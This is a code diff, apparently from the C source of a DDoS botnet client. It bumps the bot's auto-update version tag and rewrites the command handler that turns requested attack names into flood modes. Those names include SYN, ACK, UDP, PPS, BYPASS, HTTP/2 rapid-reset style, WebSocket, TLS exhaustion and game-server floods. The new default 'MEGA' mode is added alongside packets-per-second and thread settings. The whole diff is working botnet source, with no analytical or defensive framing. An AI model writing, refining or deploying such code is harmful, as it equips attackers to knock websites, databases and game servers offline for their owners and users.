@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.73"
+#define BOT_VERSION_TAG "v4.0.74"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -627,15 +627,18 @@ int main(int argc, char *argv[])
                 json_str(buf, "open_ports", atk.open_ports, sizeof(atk.open_ports));
                 if (!atk.max_pps) atk.max_pps = cfg.default_pps;
                 if (!atk.max_threads) atk.max_threads = cfg.default_threads;
-                if (!atk.method[0]) strcpy(atk.method, "PSPE");
+                if (!atk.method[0]) strcpy(atk.method, "MEGA");
                 {
                     char *m = atk.method;
                     for (char *p = m; *p; p++)
                         if (*p >= 'a' && *p <= 'z') *p -= 32;
-                    /* Methods: PSPE | TCP | TLS | HTTP | GAME */
+                    /* Methods: MEGA | PSPE | TCP | TLS | HTTP | GAME */
                     if (!strcmp(m, "ACK") || !strcmp(m, "SYN") || !strcmp(m, "SYNFLOOD"))
                         strcpy(m, "TCP");
-                    else if (!strcmp(m, "UDP") || !strcmp(m, "MEGA") || !strcmp(m, "PORT") || !strcmp(m, "SCAN"))
+                    else if (!strcmp(m, "UDP") || !strcmp(m, "PPS") || !strcmp(m, "FJIUM-PPS")
+                          || !strcmp(m, "HEX") || !strcmp(m, "GUDP") || !strcmp(m, "BYPASS"))
+                        strcpy(m, "MEGA");
+                    else if (!strcmp(m, "PORT") || !strcmp(m, "SCAN"))
                         strcpy(m, "PSPE");
                     else if (!strcmp(m, "HTTPS") || !strcmp(m, "WEB") || !strcmp(m, "HTTP_PROXY")
                           || !strcmp(m, "PROXY") || !strcmp(m, "H2RAPID") || !strcmp(m, "WSFLOOD")
@@ -645,16 +648,15 @@ int main(int argc, char *argv[])
                         strcpy(m, "TLS");
                     else if (!strcmp(m, "NRO"))
                         strcpy(m, "GAME");
-                    /* MYSQL/SQL removed — ineffective against protected 3306 */
                     else if (!strcmp(m, "MYSQL") || !strcmp(m, "SQL") || !strcmp(m, "MARIADB") || !strcmp(m, "MYSQLD"))
                         strcpy(m, "TCP");
-                    if (strcmp(m, "PSPE") && strcmp(m, "TCP") && strcmp(m, "TLS") &&
-                        strcmp(m, "HTTP") && strcmp(m, "GAME")) {
+                    if (strcmp(m, "MEGA") && strcmp(m, "PSPE") && strcmp(m, "TCP") &&
+                        strcmp(m, "TLS") && strcmp(m, "HTTP") && strcmp(m, "GAME")) {
                         if (foreground)
                             fprintf(stderr, "[bot] ignore unknown method '%s'\n", m);
                         continue;
                     }
-                    if (!strcmp(m, "PSPE")) atk.mega_mode = 1;
+                    if (!strcmp(m, "MEGA")) atk.mega_mode = 1;
                     if (!strcmp(m, "TLS")) atk.tls_exhaust = 1;
                 }
                 if (atk.duration_secs <= 0) atk.duration_secs = 60;
